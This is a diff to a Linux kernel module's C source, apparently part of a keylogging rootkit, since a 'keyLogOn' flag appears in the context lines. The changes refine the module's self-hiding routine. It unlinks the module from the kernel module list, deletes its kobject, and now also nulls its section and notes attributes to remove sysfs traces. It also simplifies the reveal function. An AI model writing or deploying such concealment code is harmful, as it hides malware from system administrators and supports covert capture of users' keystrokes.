@@ -48,7 +48,6 @@ int keyLogOn = 1;
  */
 int modHidden = 0;
 static struct list_head *modList;
-static struct list_head *modKobjList;
 
 /*
  * --Debug Prints--
@@ -143,21 +142,19 @@ void hide_module(void){
                 return;
         }
 	modList = THIS_MODULE->list.prev;
-	modKobjList = THIS_MODULE->mkobj.kobj.entry.prev;
         list_del(&THIS_MODULE->list);
         kobject_del(&THIS_MODULE->mkobj.kobj);
+        THIS_MODULE->sect_attrs = NULL;
+	THIS_MODULE->notes_attrs = NULL;
         modHidden = 1;
 }
 
 //revealing the kernel module
 void reveal_module(void){
-	int returnVal;
 	if(modHidden == 0){
 		return;
 	}
 	list_add(&THIS_MODULE->list, modList);
-	returnVal = kobject_add(&THIS_MODULE->mkobj.kobj, 
-				THIS_MODULE->mkobj.kobj.parent,DEVICE_NAME);
         modHidden = 0;
 }
 
